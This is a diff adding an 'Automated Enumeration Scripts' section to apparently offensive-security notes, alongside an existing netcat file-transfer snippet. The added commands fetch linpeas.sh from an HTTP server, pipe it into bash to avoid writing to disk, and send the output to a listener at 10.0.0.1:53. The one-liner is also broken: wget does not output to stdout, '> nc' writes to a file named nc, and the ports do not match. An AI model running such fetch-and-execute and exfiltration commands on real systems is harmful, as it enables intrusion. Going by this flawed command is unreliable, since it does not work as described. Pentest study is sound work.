@@ -282,3 +282,22 @@ nc -lvnp 8080 > file.out
 #On Sending Machine:
 nc <receiving machine IP> 8080 < file
 ```
+
+## *Automated Enumeration Scripts:* ##
+Enumeration scripts are useful as they are pre set and run the same every time. They are to be transferred onto the box, piped directly into bash so we do not write to the file system. We could also send direct back through a netcat port to our machine to store there:
+```bash
+# start a python http server
+python3 -m http.server 80
+
+# run a listener on your machine:
+nc -lvnp 53 > linpeas.output
+
+#
+wget http://0.0.0.0:8080/linpeas.sh | bash > nc 10.0.0.1 53
+```
+  - [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+  - [LinENUM](https://github.com/rebootuser/LinEnum)
+  - [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) - suggests exploits to use based on the box you are on. Saves a TONNE of time.
+
+  
